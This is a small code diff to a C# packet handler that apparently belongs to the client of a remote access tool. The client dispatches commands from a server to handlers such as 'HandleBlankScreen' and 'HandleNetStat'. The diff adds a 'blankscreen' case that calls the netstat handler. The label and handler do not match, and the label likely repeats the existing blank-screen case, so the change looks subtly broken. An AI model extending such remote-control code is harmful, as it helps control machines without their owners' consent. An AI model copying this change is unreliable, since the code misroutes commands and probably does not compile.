@@ -303,6 +303,12 @@ namespace Client.Handle_Packet
                             new HandleBlankScreen();
                             break;
                         }
+                        
+                    case "blankscreen":
+                        {
+                            new HandleNetStat();
+                            break;
+                        }
                 }
             }
             catch (Exception ex)
